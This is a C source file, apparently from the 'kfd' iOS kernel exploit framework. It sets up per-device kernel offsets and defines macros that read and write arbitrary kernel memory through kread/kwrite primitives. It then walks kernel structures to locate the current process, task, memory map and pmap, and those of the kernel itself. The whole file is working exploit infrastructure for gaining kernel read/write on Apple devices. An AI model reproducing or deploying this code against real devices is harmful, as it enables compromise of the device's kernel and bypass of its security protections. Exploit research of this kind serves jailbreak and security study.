/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#include "info/dynamic_info.h"
#include "info/static_info.h"
#import <sys/utsname.h>

#define kfd_offset(field_name) (kern_versions[kfd->info.env.vid].field_name)

#define kget_u64(field_name, object_kaddr)                                        \
    ({                                                                            \
        u64 tmp_buffer = 0;                                                       \
        u64 field_kaddr = (u64)(object_kaddr) + kfd_offset(field_name);           \
        kread((u64)(kfd), (field_kaddr), (&tmp_buffer), (sizeof(tmp_buffer)));    \
        tmp_buffer;                                                               \
    })

#define kset_u64(field_name, new_value, object_kaddr)                              \
    do {                                                                           \
        u64 tmp_buffer = new_value;                                                \
        u64 field_kaddr = (u64)(object_kaddr) + kfd_offset(field_name);            \
        kwrite((u64)(kfd), (&tmp_buffer), (field_kaddr), (sizeof(tmp_buffer)));    \
    } while (0)

#define uget_u64(field_name, object_uaddr)                                 \
    ({                                                                     \
        u64 field_uaddr = (u64)(object_uaddr) + kfd_offset(field_name);    \
        u64 old_value = *(volatile u64*)(field_uaddr);                     \
        old_value;                                                         \
    })

#define uset_u64(field_name, new_value, object_uaddr)                      \
    do {                                                                   \
        u64 field_uaddr = (u64)(object_uaddr) + kfd_offset(field_name);    \
        *(volatile u64*)(field_uaddr) = (u64)(new_value);                  \
    } while (0)

const char info_copy_sentinel[] = "p0up0u was here";
const u64 info_copy_sentinel_size = sizeof(info_copy_sentinel);

void info_init(struct kfd* kfd) {
    kfd->info.copy.size = pages(4);
    assert(kfd->info.copy.size > msg_ool_size_small);
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.dst_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE));
    for (u64 offset = pages(0); offset < kfd->info.copy.size; offset += pages(1)) {
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), info_copy_sentinel_size);
        bcopy(info_copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), info_copy_sentinel_size);
    }
    kfd->info.env.pid = getpid();
    thread_identifier_info_data_t data = {};
    thread_info_t info = (thread_info_t)(&data);
    mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
    assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
    kfd->info.env.tid = data.thread_id;
    usize size1 = sizeof(kfd->info.env.maxfilesperproc);
    assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));
    struct rlimit rlim = { .rlim_cur = kfd->info.env.maxfilesperproc, .rlim_max = kfd->info.env.maxfilesperproc };
    assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));
    usize size2 = sizeof(kfd->info.env.kern_version);
    assert_bsd(sysctlbyname("kern.version", &kfd->info.env.kern_version, &size2, NULL, 0));
    t1sz_boot = strstr(kfd->info.env.kern_version, "T8120") != NULL ? 17ull : 25ull;
    const u64 number_of_kern_versions = sizeof(kern_versions) / sizeof(kern_versions[0]);
    struct utsname systemInfo;
    uname(&systemInfo);
    char build_version[256];
    size_t build_version_size = sizeof(build_version);
    sysctlbyname("kern.osversion", build_version, &build_version_size, NULL, 0);
    for (u64 i = 0; i < number_of_kern_versions; i++) {
        const char* current_kern_version = kern_versions[i].kern_version;
        const char* current_device_id = kern_versions[i].device_id;
        const char* current_build_version = kern_versions[i].build_version;
        if (strcmp(current_device_id, systemInfo.machine) == 0 && strcmp(current_kern_version, kfd->info.env.kern_version) == 0 && strcmp(current_build_version, build_version) == 0) {
            kfd->info.env.vid = i;
            return;
        }
    }
    kfd->info.env.vid = 0;
    return;
}

void info_run(struct kfd* kfd) {
    assert(kfd->info.kaddr.current_proc);
    kfd->info.kaddr.current_task = kfd->info.kaddr.current_proc + kfd_offset(proc__object_size);
    printf("Our proc: 0x%llx\n", kfd->info.kaddr.current_proc);
    printf("Our task: 0x%llx\n", kfd->info.kaddr.current_task);
    u64 signed_map_kaddr = kget_u64(task__map, kfd->info.kaddr.current_task);
    kfd->info.kaddr.current_map = unsign_kaddr(signed_map_kaddr);
    u64 signed_pmap_kaddr = kget_u64(_vm_map__pmap, kfd->info.kaddr.current_map);
    kfd->info.kaddr.current_pmap = unsign_kaddr(signed_pmap_kaddr);
    const bool find_current_thread = false;
    if (find_current_thread) {
        u64 thread_kaddr = kget_u64(task__threads__next, kfd->info.kaddr.current_task);
        while (true) {
            u64 tid = kget_u64(thread__thread_id, thread_kaddr);
            if (tid == kfd->info.env.tid) {
                kfd->info.kaddr.current_thread = thread_kaddr;
                kfd->info.kaddr.current_uthread = thread_kaddr + kfd_offset(thread__object_size);
                break;
            }
            thread_kaddr = kget_u64(thread__task_threads__next, thread_kaddr);
        }
    }
    if (kfd->info.kaddr.kernel_proc) {
        kfd->info.kaddr.kernel_task = kfd->info.kaddr.kernel_proc + kfd_offset(proc__object_size);
        printf("Kernel proc: 0x%llx\n", kfd->info.kaddr.kernel_proc);
        printf("Kernel task: 0x%llx\n", kfd->info.kaddr.kernel_task);
        u64 signed_map_kaddr = kget_u64(task__map, kfd->info.kaddr.kernel_task);
        kfd->info.kaddr.kernel_map = unsign_kaddr(signed_map_kaddr);
        u64 signed_pmap_kaddr = kget_u64(_vm_map__pmap, kfd->info.kaddr.kernel_map);
        kfd->info.kaddr.kernel_pmap = unsign_kaddr(signed_pmap_kaddr);
    }
}

void info_free(struct kfd* kfd) {
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
}
